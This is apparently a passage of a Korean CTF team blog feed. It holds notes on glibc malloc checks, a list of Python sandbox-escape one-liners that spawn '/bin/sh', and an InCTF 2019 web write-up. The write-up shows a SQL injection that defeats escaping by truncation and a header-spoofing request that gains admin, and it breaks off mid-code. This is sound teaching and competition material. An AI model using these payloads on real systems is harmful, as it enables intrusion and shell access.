style="text-align:left"><code>nextsize &gt;= av-&gt;system_mem</code></td><td style="text-align:left">free(): invalid next size (normal)</td></tr><tr><td style="text-align:left"><code>fwd-&gt;bk != bck</code></td><td style="text-align:left">free(): corrupted unsorted chunks</td></tr></tbody></table></div><hr><h2 id="5-3-checks-in-unlink"><a href="#5-3-checks-in-unlink" class="headerlink" title="5-3 checks in unlink"></a>5-3 checks in unlink</h2><div class="table-container"><table><thead><tr><th style="text-align:left">Checks</th><th style="text-align:left">Error Message</th></tr></thead><tbody><tr><td style="text-align:left"><code>FD-&gt;bk != P</code> or <code>BK-&gt;fd != P, 0</code></td><td style="text-align:left">corrupted double-linked list</td></tr><tr><td style="text-align:left"><code>P-&gt;fd_nextsize-&gt;bk_nextsize != P</code> or <code>P-&gt;bk_nextsize-&gt;fd_nextsize != P</code></td><td style="text-align:left">corrupted double-linked list (not small)</td></tr></tbody></table></div><hr><h1 id="마치며"><a href="#마치며" class="headerlink" title="마치며.."></a>마치며..</h1><p>전에는 단순히 다른 사람이 정리해놓은 문서를 보고 필요한 만큼만 이해했었는데, 이 문서를 쓰면서 bin을 찾는 과정이나, bin에 넣는 과정 등등을 알아갈 수 있었다.</p><p>아쉬운 점은 세부적으로 분석은 많이 했는데 간단하게 표현을 하지 못한 점, 많은 부분(힙익스 페이로드를 놓고, 어떻게 동작하는지, 어떤 부분을 이용한건지 등등)을 써보고 싶었지만 팀프로젝트 기간이라 당장 리눅스 커널 익스를 해야하는 형국이라 나중에 시간이 나게 되면 추가적으로 문서화하도록 해야겠다.</p><p>리눅스 커널 익스하면서도 kmalloc, vmalloc 등 특이한 동적 메모리 관리 방법도 알아가는 중이라 틈틈히 추가하고 다듬는 과정을 통해서 더 정확하고, 유익한 정보가 있는 문서가 되었으면 좋겠다.</p><hr><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p>[Understanding glibc malloc 번역] <a href="https://tribal1012.tistory.com/78" target="_blank" rel="noopener">https://tribal1012.tistory.com/78</a></p><p>[Heap 영역 정리] <a href="https://tribal1012.tistory.com/141" target="_blank" rel="noopener">https://tribal1012.tistory.com/141</a></p><p>[Hacker’s Hut: Exploiting the heap] <a href="https://www.win.tue.nl/~aeb/linux/hh/hh-11.html" target="_blank" rel="noopener">https://www.win.tue.nl/~aeb/linux/hh/hh-11.html</a></p><p>[glib malloc] <a href="https://umbum.tistory.com/386" target="_blank" rel="noopener">https://umbum.tistory.com/386</a></p><blockquote id="fn_size_alignment"><sup>size_alignment</sup>. <code>sizeof(size_t) * 2</code>(32비트에서 8바이트) 단위로 정렬된다.<a href="#reffn_size_alignment" title="Jump back to footnote [size_alignment] in the text."> &#8617;</a></blockquote><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content:encoded>
      
      <comments>https://defenit.kr/2019/09/30/Pwn/%E3%84%B4%20Research/malloc/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Python Jail Tips</title>
      <link>https://defenit.kr/2019/09/27/Pwn/%E3%84%B4%20Research/python_jail/</link>
      <guid>https://defenit.kr/2019/09/27/Pwn/%E3%84%B4%20Research/python_jail/</guid>
      <pubDate>Fri, 27 Sep 2019 04:48:25 GMT</pubDate>
      <description>
      
        
        
          &lt;h3 id=&quot;목차&quot;&gt;&lt;a href=&quot;#목차&quot; class=&quot;headerlink&quot; title=&quot;목차&quot;&gt;&lt;/a&gt;목차&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;문자열 만들기&lt;/li&gt;
&lt;li&gt;숫자 만들기&lt;/li&gt;
&lt;li&gt;문자열 합치기&lt;/li&gt;
&lt;li&gt;응용&lt;/li&gt;
&lt;li&gt;Ti
        
      
      </description>
      
      <content:encoded><![CDATA[<h3 id="목차"><a href="#목차" class="headerlink" title="목차"></a>목차</h3><ul><li>문자열 만들기</li><li>숫자 만들기</li><li>문자열 합치기</li><li>응용</li><li>Tips</li></ul><hr><h3 id="문자열-만들기"><a href="#문자열-만들기" class="headerlink" title="문자열 만들기"></a>문자열 만들기</h3><ul><li><code>chr(0x61)</code>          # ‘a’</li><li><code>str(1)</code>                # ‘1’</li><li><code>dir([])[0][2]</code> # ‘a’<ul><li>dir([])만 입력했을 때 결과는 다음과 같고 이를 인덱싱해서 문자열을 얻는 것이다.<ul><li><img src="https://user-images.githubusercontent.com/43925259/65742854-ed721c80-e12c-11e9-8d4f-9d4c33f0c3dc.png" alt="1"></li></ul></li></ul></li></ul><hr><h3 id="숫자-만들기"><a href="#숫자-만들기" class="headerlink" title="숫자 만들기"></a>숫자 만들기</h3><ul><li><code>~(()&lt;())</code>                  # -1</li><li><code>({}&lt;[])&gt;&gt;({}&lt;[])</code> #  0</li><li><code>({}&lt;[])&lt;&lt;({}&gt;[])</code> #  1</li><li><code>({}&lt;[])&lt;&lt;({}&lt;[])</code> #  2</li></ul><hr><h3 id="문자열-합치기"><a href="#문자열-합치기" class="headerlink" title="문자열 합치기"></a>문자열 합치기</h3><ul><li><code>&#39;a&#39;+&#39;b&#39;</code></li><li><code>&#39;a&#39;&#39;b&#39;</code></li><li><code>&#39;&#39;.join([&#39;a&#39;,&#39;b&#39;])</code></li><li><code>&#39;{}{}&#39;.format(&#39;a&#39;,&#39;b&#39;)</code></li><li><code>&#39;a&#39;.__add__(&#39;b&#39;)</code></li></ul><hr><h3 id="응용"><a href="#응용" class="headerlink" title="응용"></a>응용</h3><ul><li><p><code>.</code> 을 사용하지 못할경우</p><ul><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(<span class="string">'__import__("os")\x2esystem("sh")'</span>)</span><br></pre></td></tr></table></figure></li><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getattr(__import__(<span class="string">'os'</span>),<span class="string">'system'</span>)(<span class="string">'sh'</span>)</span><br></pre></td></tr></table></figure></li><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vars(__import__(<span class="string">'os'</span>))[<span class="string">'system'</span>](<span class="string">'sh'</span>)</span><br></pre></td></tr></table></figure></li><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getattr(__import__(dir(__import__(<span class="string">"glob"</span>))[<span class="number">23</span>]),dir(__import__(dir(__import__(<span class="string">"glob"</span>))[<span class="number">23</span>]))[<span class="number">309</span>])(<span class="string">"/bin/sh"</span>)</span><br></pre></td></tr></table></figure></li></ul></li></ul><ul><li><p><code>_</code> 를 사용하지 못할경우</p><ul><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(<span class="string">'\x5f\x5fimport\x5f\x5f("os").system("sh")'</span>)</span><br></pre></td></tr></table></figure></li><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getattr(vars(vars()[dir()[<span class="number">0</span>]])[<span class="string">'\x5f\x5fimport\x5f\x5f'</span>](<span class="string">'os'</span>), <span class="string">'system'</span>)(<span class="string">'sh'</span>)</span><br></pre></td></tr></table></figure></li></ul></li></ul><ul><li><p>문자열을 사용하지 못할경우</p><ul><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vars(vars()[dir()[<span class="number">0</span>]])[dir(__builtins__)[<span class="number">56</span>]](dir()[<span class="number">1</span>][<span class="number">3</span>]+dir()[<span class="number">0</span>][<span class="number">9</span>]).system(dir(__doc__)[<span class="number">0</span>][<span class="number">5</span>] + dir(__doc__)[<span class="number">5</span>][<span class="number">2</span>])</span><br></pre></td></tr></table></figure></li></ul></li></ul><hr><h3 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h3><ul><li><h5 id="파일-경로-알아오기"><a href="#파일-경로-알아오기" class="headerlink" title="파일 경로 알아오기"></a>파일 경로 알아오기</h5><ul><li><p><code>raise(BaseException())</code> 를 이용</p></li><li><p><img src="https://user-images.githubusercontent.com/43925259/65742856-f19e3a00-e12c-11e9-85b9-7b90237a72b7.png" alt="2"></p></li></ul></li></ul><ul><li><h5 id="필터링-단어-삭제"><a href="#필터링-단어-삭제" class="headerlink" title="필터링 단어 삭제"></a>필터링 단어 삭제</h5><ul><li><p>필터링 체크를 같은 파일 내에서 하고, <code>dir</code> 등을 이용해서 변수명을 가져올 수 있을 경우 <code>del</code>을 이용</p></li><li><p><img src="https://user-images.githubusercontent.com/43925259/65742857-f367fd80-e12c-11e9-8079-db276e9336c6.png" alt="3"></p></li><li><p>필터링하는 변수명을 dir()로 알아내고 del로 import를 지운 모습이다.</p></li></ul></li></ul><ul><li><h5 id="import가-있을-경우-셸-따는-법"><a href="#import가-있을-경우-셸-따는-법" class="headerlink" title="import가 있을 경우 셸 따는 법"></a>import가 있을 경우 셸 따는 법</h5><ul><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(<span class="string">"os"</span>).system(<span class="string">"/bin/sh"</span>)</span><br></pre></td></tr></table></figure></li><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(<span class="string">"subprocess"</span>).call(<span class="string">"/bin/sh"</span>)</span><br></pre></td></tr></table></figure></li><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(<span class="string">"ctypes"</span>).CDLL(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>).system(<span class="string">"/bin/sh"</span>)</span><br></pre></td></tr></table></figure><ul><li>서버 우분투 버전에 따라 주소가 다를 수 있는데, <code>2.23 ~ 2.29</code>까지 숫자만 바꿔보면 된다.</li></ul></li></ul></li></ul><ul><li><h5 id="execfile-사용"><a href="#execfile-사용" class="headerlink" title="execfile 사용"></a><code>execfile 사용</code></h5><ul><li><p><code>execfile(&#39;/usr/lib/python2.7/os.py&#39;)</code> 처럼 사용할 경우 os 모듈의 함수 사용 가능</p><ul><li><p>주소는 서버 환경에 따라 다를수도 있다.</p></li><li><p><code>from os import *</code>가 된 것과 동일하기 때문에 <code>system(&quot;/bin/sh&quot;)</code> 가능</p></li></ul></li></ul></li></ul><ul><li><h5 id="open이-필터링-되어있을-때-file-사용"><a href="#open이-필터링-되어있을-때-file-사용" class="headerlink" title="open이 필터링 되어있을 때, file 사용"></a><code>open</code>이 필터링 되어있을 때, <code>file</code> 사용</h5><ul><li>file도 open과 같이 파일을 열 수 있는 명령이고 read가 필터링 안되었다면 유용하다.</li></ul></li></ul><ul><li><h5 id="이-필터링-되어있을-때-변수-선언"><a href="#이-필터링-되어있을-때-변수-선언" class="headerlink" title="=이 필터링 되어있을 때 변수 선언"></a><code>=</code>이 필터링 되어있을 때 <strong>변수 선언</strong></h5><ul><li><p><code>setattr(__builtins__,&#39;a&#39;,&#39;b&#39;)</code></p><ul><li>a = ‘b’와 동일한 표현</li></ul></li></ul></li></ul><ul><li><h5 id="spawnlp-이용"><a href="#spawnlp-이용" class="headerlink" title="spawnlp 이용"></a><code>spawnlp</code> 이용</h5><ul><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">o = &#123;x.__name__:x <span class="keyword">for</span> x <span class="keyword">in</span> object.__subclasses__()&#125;[<span class="string">'StreamReaderWriter'</span>].__init__.__globals__[<span class="string">'sys'</span>].modules[<span class="string">'o'</span>+<span class="string">'s'</span>]</span><br><span class="line">o.spawnlp(o.P_WAIT, <span class="string">'ls'</span>, <span class="string">'ls'</span>, <span class="string">'-l'</span>, <span class="string">'./'</span>)</span><br></pre></td></tr></table></figure></li><li><p><code>import</code>, <code>system</code>, <code>os</code> 등이 필터링 되어있을 경우 유용하게 사용 가능</p></li></ul></li></ul><hr><h3 id="레퍼런스"><a href="#레퍼런스" class="headerlink" title="레퍼런스"></a>레퍼런스</h3><p>없음</p><hr><h3 id="문서-역사"><a href="#문서-역사" class="headerlink" title="문서 역사"></a>문서 역사</h3><p><code>2019-09-27</code> <strong>c2w2m2: 최초 작성</strong></p><p><code>2019-09-27</code> <strong>JSec: 내용 보충</strong></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content:encoded>
      
      <comments>https://defenit.kr/2019/09/27/Pwn/%E3%84%B4%20Research/python_jail/#disqus_thread</comments>
    </item>
    
    <item>
      <title>InCTF 2019 Copy-Cat Write up</title>
      <link>https://defenit.kr/2019/09/24/Web/%E3%84%B4%20WriteUps/InCTF_2019_Copy-Cat_Writeup/</link>
      <guid>https://defenit.kr/2019/09/24/Web/%E3%84%B4%20WriteUps/InCTF_2019_Copy-Cat_Writeup/</guid>
      <pubDate>Tue, 24 Sep 2019 11:29:09 GMT</pubDate>
      <description>
      
        
        
          &lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/39398965/65524775-5a1cc980-df29-11e9-9237-b9fed69bff27.png&quot; alt=&quot;2019-09-24 오후 10-30-
        
      
      </description>
      
      <content:encoded><![CDATA[<p><img src="https://user-images.githubusercontent.com/39398965/65524775-5a1cc980-df29-11e9-9237-b9fed69bff27.png" alt="2019-09-24 오후 10-30-04"></p><p>해당 문제는 인도의 bi0s Team에서 주최한 <strong>InCTF 2019</strong>의 <strong>Copy-Cat</strong>이란 <strong>Web</strong> 문제입니다.</p><p>문제 풀면서 얻어간 것도 있고, 개인적으로는 해당 대회에서 가장 재밌게 푼 문제라 Write up을 작성하게 되었습니다.</p><hr><h1 id="문제분석"><a href="#문제분석" class="headerlink" title="문제분석"></a>문제분석</h1><p>문제 소스 :  <a href="https://github.com/JeonYoungSin/test/files/3652985/Copy-Cat.zip" target="_blank" rel="noopener">Copy-Cat.zip</a></p><p>해당 문제는 전체 소스코드를 제공해주는 화이트박스 형식의 문제였습니다. 소스코드 분석에 앞서 문제 사이트에 먼저 들어가보면 아래와 같이 간단한 로그인 기능만 보이는 것을 볼 수 있습니다.</p><p><img src="https://user-images.githubusercontent.com/39398965/65525784-07441180-df2b-11e9-9033-c8684693b5ff.png" alt="image"></p><p>해당 기능을 통해 뭘 해야하는지 다운받은 코드를 분석해보면 로그인 시 아래와 같은 형태로  <strong>계정명,비밀번호를 check 함수를 통해 검증</strong>하고 있는 것을 볼 수 있습니다.</p><p><strong>login.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"config.php"</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"functions.php"</span>);</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$user = $_POST[<span class="string">'username'</span>];</span><br><span class="line">$pass = $_POST[<span class="string">'password'</span>];</span><br><span class="line"></span><br><span class="line">$user = check($user);</span><br><span class="line">$pass = check($pass);   <span class="comment">//I know you are naughty!!</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"SELECT username, password FROM inctf2019_cat WHERE username='"</span> .$user .<span class="string">"' &amp;&amp; password='"</span> .$pass .<span class="string">"'"</span>;</span><br><span class="line">$result = $conn-&gt;query($sql);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($result-&gt;num_rows &gt; <span class="number">0</span> || $_SESSION[<span class="string">'logged'</span>]==<span class="number">1</span>)&#123;</span><br><span class="line">$_SESSION[<span class="string">'logged'</span>] = <span class="number">1</span>;</span><br><span class="line">header(<span class="string">"Location: admin.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Incorrect Credentials"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$conn-&gt;close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>check 함수에서 수행하는 동작은 아래와 같습니다. 먼저 <strong>real_escape_string</strong> 함수를 통해 ‘,”,\ 와 같은 특수문자에 <strong>\ (backslash)</strong>를 추가해 SQL Injection을 방어한 뒤 길이 값을 확인해 5~11 글자의 입력 값만 받는 것을 볼 수 있습니다.  </p><p><strong>config.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">..생략..</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $conn;</span><br><span class="line">    $str = $conn-&gt;real_escape_string($str);</span><br><span class="line">    <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($tocheck)</span></span>&#123;</span><br><span class="line">  $tocheck = trim(escape($tocheck));</span><br><span class="line">  <span class="keyword">if</span>(strlen($tocheck)&lt;<span class="number">5</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"For God Sake, don't try to HACK me!!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(strlen($tocheck)&gt;<span class="number">11</span>)&#123;</span><br><span class="line">    $tocheck = substr($tocheck, <span class="number">0</span>, <span class="number">11</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> $tocheck;</span><br><span class="line">&#125;</span><br><span class="line">..생략..</span><br></pre></td></tr></table></figure><p>여기서 해당 코드를 주의깊게 보면 <strong>입력 값의 길이가 11글자보다 크면 substr를 통해 입력 값을 자르는 걸 볼 수 있는데, 이를 통해  real_escape_string 함수를 통해 추가된 backslash를 무력화시켜 SQL Injetcion을 수행</strong>할 수 있게 됩니다. 공격 원리는 아래와 같습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username = 1234567890\ -&gt; real_escape_string  -&gt; 1234567890\\ -&gt; substr(1234567890\\,0,11) -&gt; 1234567890\</span><br></pre></td></tr></table></figure><p>위와 같이 substr을 통해 최종적으로 real_escape_string를 통해 추가된 \를 제거할 수 있고 추가로 password에 인젝션 구문을 넣어주면 <strong>SQL Injection을 통해 참 값</strong>을 만들 수 있게 됩니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">username = 1234567890\ , password =   or 1#</span><br><span class="line"></span><br><span class="line">result</span><br><span class="line">$sql = &quot;SELECT username, password FROM inctf2019_cat WHERE username=&apos;1234567890\&apos; &amp;&amp; password=&apos; or 1#&apos;;</span><br></pre></td></tr></table></figure><hr><p>이제 해당 payload로 로그인에 성공해 admin.php 페이지에 가게되면 “<strong>Sorry, It seems you are not Admin…are you? If yes, proove it then !!</strong>“ 란 메시지가 저희를 반겨줍니다. 뭐가 문젠지 코드를 다시보면 </p><p><strong>functions.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">..생략..</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_admin</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>($_SESSION[<span class="string">'admin'</span>]!=<span class="string">"True"</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Sorry, It seems you are not Admin...are you? If yes, proove it then !!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">..생략..</span><br></pre></td></tr></table></figure><p>세션에 admin 값이 True로 세팅되어 있어야 하는 것을 볼 수 있습니다. 그럼 이제 해당 값이 언제 True로 세팅되는지 전체 코드에서 검색해보면 아래와 같은 형태의 로직이 존재하는 것을 볼 수 있습니다.</p><p><strong>remote_admin.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">"functions.php"</span>;</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">is_login();</span><br><span class="line"></span><br><span class="line"><span class="comment"># If admin wants to open his website remotely</span></span><br><span class="line"></span><br><span class="line">$remote_admin = create_function(<span class="string">""</span>,<span class="string">'if(isset($_SERVER["HTTP_I_AM_ADMIN"]))&#123;$_SERVER["REMOTE_ADDR"] = $_SERVER["HTTP_I_AM_ADMIN"];&#125;'</span>);</span><br><span class="line"></span><br><span class="line">$random = bin2hex(openssl_random_pseudo_bytes(<span class="number">32</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"function admin_$random() &#123;"</span></span><br><span class="line">  .<span class="string">"global \$remote_admin; \$remote_admin();"</span></span><br><span class="line">  .<span class="string">"&#125;"</span>);</span><br><span class="line"></span><br><span class="line">send($random);</span><br><span class="line"></span><br><span class="line">$_GET[<span class="string">'random'</span>]();    <span class="comment">//Only Admin knows next random value; You don't have to worry about HOW?</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>]==<span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line">  $_SESSION[<span class="string">'admin'</span>] = <span class="string">"True"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>코드를 분석해보면 <code>$_SERVER[&quot;REMOTE_ADDR&quot;]</code>를 통해 해당 페이지에 접근한 아이피가 127.0.0.1일 때만 세션 내 admin 값을 True로 세팅되는걸 볼 수 있습니다. 이를 가능하게 하려면 <code>$_SERVER[&quot;HTTP_I_AM_ADMIN&quot;]</code> 의 값을 127.0.0.1로 덮은 후 <code>create_function</code>을 통해 생성된 함수를 호출해주면 됩니다.</p><p>함수 호출과 같은 경우 PHP에선<strong><code>&quot;문자열&quot;();</code></strong> 형태로 함수 호출이 가능하기 때문에 <strong><code>$_GET[&#39;random&#39;]();</code></strong> 코드를 통해 함수 호출이 가능합니다. 이를 토대로 함수를 호출하려고 보면, <strong><code>create_function 함수를 통해 생성된 익명함수는 변수형태로 존재해 문자열 형태로 호출이 불가</code></strong>하고, 해당 함수를 호출해주는 <strong><code>admin_$random 함수는 $random 값이 랜덤한 값으로 요청시마다 세팅</code></strong>되기 때문에 호출이 불가한 것을 볼 수 있습니다.</p><p>이를 우회하기 위해 이것저것 생각해보다 php create_function의 소스코드를 분석해보았고 아래와 같은 사실을 알 수 있었습니다.</p><p><strong>zend_builtin_function.c</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#define LAMBDA_TEMP_FUNCNAME"__lambda_func"</span></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; proto string create_function(string args, string code)</span></span><br><span class="line"><span class="comment">   Creates an anonymous function, and returns its name (funny, eh?) */</span></span><br><span class="line">ZEND_FUNCTION(create_function)</span><br><span class="line">&#123;</span><br><span class="line"> ..생략..</span><br><span class="line"></span><br><span class="line">function_name = zend_string_alloc(sizeof(<span class="string">"0lambda_"</span>)+MAX_LENGTH_OF_LONG, <span class="number">0</span>);</span><br><span class="line">ZSTR_VAL(function_name)[<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">ZSTR_LEN(function_name) = snprintf(ZSTR_VAL(function_name) + <span class="number">1</span>, sizeof(<span class="string">"lambda_"</span>)+MAX_LENGTH_OF_LONG, <span class="string">"lambda_%d"</span>, ++EG(lambda_count)) + <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">while</span> (zend_hash_add_ptr(EG(function_table), function_name, func) == <span class="keyword">NULL</span>);</span><br><span class="line">RETURN_NEW_STR(function_name);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">zend_hash_str_del(EG(function_table), LAMBDA_TEMP_FUNCNAME, sizeof(LAMBDA_TEMP_FUNCNAME)<span class="number">-1</span>);</span><br><span class="line">RETURN_FALSE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>위 코드를 보면 <code>create_function 함수 호출 후 반환되는 값이 \x00lambda_%d 형태</code>인 것을 확인할 수 있었고, 실제 로컬에서 테스트해본결과 <strong><code>\x00lambda\_1,\x00lambda_2</code></strong> 형태의 문자열 형태로 익명 함수 name이 반환되는 걸 볼 수 있었습니다.</p><p>그럼 다시 문제코드로 돌아와, 우리는 아래와 같이 <code>$remote_admin</code> 변수에 담기는 <strong><code>익명 함수명의 문자열 값을 예측</code></strong>할 수 있기 때문에  <code>admin_$random() 함수의 호출 없이 익명 함수를 호출해 관리자 권한을 획득</code>할 수 있습니다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$remote_admin = create_function(<span class="string">""</span>,<span class="string">'if(isset($_SERVER["HTTP_I_AM_ADMIN"]))&#123;$_SERVER["REMOTE_ADDR"] = $_SERVER["HTTP_I_AM_ADMIN"];&#125;'</span>);</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET /remote_admin.php?random=%00lambda_1 HTTP/1.1</span><br><span class="line">Host: 3.15.186.158</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">I-AM-ADMIN: 127.0.0.1</span><br><span class="line">Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">Cookie: PHPSESSID=2grnkh3472812hpf3jg4p2m5g6</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><hr><p>이제 admin 권한을 획득한 뒤 admin페이지에 다시 접근 하면 아래와 같은 <strong>업로드 기능</strong>이 존재합니다.</p><p><img src="https://user-images.githubusercontent.com/39398965/65532094-2e541080-df36-11e9-9231-a10bd6a7fab5.png" alt="image"></p><p>해당 기능을 수행하는 코드는 다음과 같습니다.</p><p><strong>upload.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"functions.php"</span>);</span><br><span class="line"></span><br><span class="line">is_login();</span><br><span class="line">is_admin();</span><br><span class="line"></span><br><span class="line">$SANDBOX = getcwd() . <span class="string">"/uploads/"</span> . md5(<span class="string">"xxSpyD3rxx"</span> . 